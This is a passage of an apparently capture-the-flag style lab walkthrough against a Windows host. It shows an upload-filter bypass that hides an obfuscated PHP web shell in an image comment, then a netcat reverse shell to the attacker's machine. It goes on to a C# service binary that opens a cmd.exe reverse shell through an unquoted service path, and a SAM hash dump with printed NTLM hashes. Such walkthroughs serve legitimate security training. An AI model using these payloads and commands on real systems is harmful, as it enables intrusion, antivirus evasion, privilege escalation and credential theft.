Initial Commit for the back-end


=======================================
```

The one without parent value (hash) is the initial commit, the last directory (18f2) is the second commit and remaining (f8f3) is latest commit. Let’s look into source of the latest commit

```
⛩\> cd 1-345ac8b236064b431fa43f53d91c98c4834ef8f3/

⛩\> ls
commit-meta.txt  css  favicon.png  fonts  img  index.html  js  resources

⛩\> cd resources/

⛩\> ls
assets  index.php
```

Let’s read the php file for any information.

```
<?php

        if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
                $target = "uploads/".basename($_FILES["file"]["name"]);
                $goodExts = ["jpg", "jpeg", "png", "gif"];
                if(file_exists($target)){
                        header("location: ./?msg=Exists");
                        die();
                }
                $size = getimagesize($_FILES["file"]["tmp_name"]);
                if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
                        header("location: ./?msg=Fail");
                        die();
                }
                move_uploaded_file($_FILES["file"]["tmp_name"], $target);
                header("location: ./?msg=Success");
                die();
        } else if ($_SERVER["REQUEST_METHOD"] == "post"){
                header("location: ./?msg=Method");
        }


        if(isset($_GET["msg"])){
                $msg = $_GET["msg"];
                switch ($msg) {
                        case "Success":
                                $res = "File uploaded successfully!";
                                break;
                        case "Fail":
                                $res = "Invalid File Type";
                                break;
                        case "Exists":
                                $res = "File already exists";
                                break;
                        case "Method":
                                $res = "No file send";
                                break;

                }
        }
?>
```

This file consist of image upload source.

> TL;DR Only allows image formats to upload, checks for image size (dimension), after successful upload it moves that file to ‘uploads’ directory.

We have to bypass file format and size to successfully upload our PHP payload. This can be done with ‘exiftool’. However, an endpoint security (AV) is running on this windows OS. To bypass that we need to obfuscate our PHP payload. To do that we can use this following online tool.

[PHP Obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)

We will use below PHP code to obfuscate.

```
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

![Screen Shot 2021-09-15 at 00.30.03.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/0E1B4224-BBB6-43A0-AE9B-6C0D80080D1C_2/Screen%20Shot%202021-09-15%20at%2000.30.03.png)

![Screen Shot 2021-09-15 at 00.30.27.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/3CC97DC5-980C-4AFF-90BF-795104DDD1DE_2/Screen%20Shot%202021-09-15%20at%2000.30.27.png)

We can now use obfuscated payload with exiftool. Download any image from the internet or use any default image from your machine.

```
⛩\> exiftool -Comment="<?php \$l0=\$_GET[base64_decode('Y21k')];if(isset(\$l0)){echo base64_decode('PHByZT4=').shell_exec(\$l0).base64_decode('PC9wcmU+');}die();?>" rce.png
    1 image files updated

⛩\> cp rce.png rce.png.php
```

So, we commenting our payload inside image under ‘comment’ section, then renaming it to ‘.png.php’.

**Note: Make sure to escape $ from the obfuscated code.**

Now let’s visit the /resources endpoint and upload our payload.

![Screen Shot 2021-09-15 at 00.35.47.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/96B19048-8430-4BC8-A306-9A30F61A9172_2/Screen%20Shot%202021-09-15%20at%2000.35.47.png)

Authentication mechanism in place, so let’s use ‘thomas’ as username and password which we previously cracked.

![Screen Shot 2021-09-15 at 00.37.05.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/59E75746-6434-4FB4-A3F5-A4067879F06D_2/Screen%20Shot%202021-09-15%20at%2000.37.05.png)

Let’s upload the payload.

![Screen Shot 2021-09-15 at 00.37.51.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/5259E371-DB98-4710-A324-861CCD23E5DB_2/Screen%20Shot%202021-09-15%20at%2000.37.51.png)

It worked and now we need to access the payload.

![Screen Shot 2021-09-15 at 00.38.35.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/EE2D5D91-59C1-47BB-8ED1-5F3C486024E7_2/Screen%20Shot%202021-09-15%20at%2000.38.35.png)

Alright, we got the code execution. Now we need to upload/download netcat binary on target.

> [https://github.com/int0x33/nc.exe/](https://github.com/int0x33/nc.exe/)

Get x64 compiled binary from the repo and setup an HTTP server on Kali machine.

![Screen Shot 2021-09-15 at 01.26.51.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/A331C8CA-3B8B-4CBA-AF82-314BE4CC715C_2/Screen%20Shot%202021-09-15%20at%2001.26.51.png)

Setup a listener and execute netcat to get reverse connection.

![Screen Shot 2021-09-15 at 01.29.00.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/FA93D748-8620-4C7F-B3F4-2A65535C0D4B_2/Screen%20Shot%202021-09-15%20at%2001.29.00.png)

Check the listener.

```
⛩\> pwncat --platform windows -lp 9001
[08:28:49] Welcome to pwncat 🐈!                                                                                                                __main__.py:143
[08:29:27] received connection from 10.200.185.100:51386                                                                                             bind.py:57
[08:29:28] 0.0.0.0:9001: dropping stage one in '\\Windows\\Tasks\\rlPCnt9Y'                                                                      manager.py:502
[08:29:31] 0.0.0.0:9001: using install utils from .net v4.0.30319                                                                                manager.py:502
[08:29:33] 10.200.185.100:51386: registered new host w/ db                                                                                       manager.py:502
(local) pwncat$
(remote) Thomas@WREATH-PC:C:\xampp\htdocs\resources\uploads$ whoami
whoami
wreath-pc\thomas
```

WinPeas detected a lot of vulnerabilities based on previously installed patches, but we will take advantage of ‘unquoted service path’ exploit.

![Screen Shot 2021-09-15 at 01.38.31.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/9AE0B833-AF1C-4F3D-AFB3-49903B0BEC3C_2/Screen%20Shot%202021-09-15%20at%2001.38.31.png)

This service is running with local system privileges and we have permission to read/write (full control) the directory of service.

```
C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
```

We will use a custom payload to exploit this.

```
⛩\> cat Wrapper.cs
using System;
using System.Diagnostics;
namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc_shell.exe", "10.50.182.101 9002 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

We will take advantage of previously uploaded netcat one more time. To compile this code, we need to install mono application.

```
⛩\> sudo apt install mono-devel
```

Once installed, we can compile it and rename it.

```
⛩\> mcs Wrapper.cs

⛩\> file Wrapper.exe
Wrapper.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows

⛩\> mv Wrapper.exe System.exe
```

Make sure to start a listener on Kali Linux. Download this binary to below directory via curl and then stop and start the service.

```
C:\Program Files (x86)\System Explorer>curl http://10.50.182.101:9090/System.exe -o System.exe

C:\Program Files (x86)\System Explorer>sc stop SystemExplorerHelpService

C:\Program Files (x86)\System Explorer>sc start SystemExplorerHelpService
```

Check the listener for reverse connection.

```
⛩\> nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.50.182.101] from (UNKNOWN) [10.200.185.100] 51609
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We got system level access. If you want you can dump admin hash. You need to download ‘sam and system’ files from target machine.

```
⛩\> secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...
```

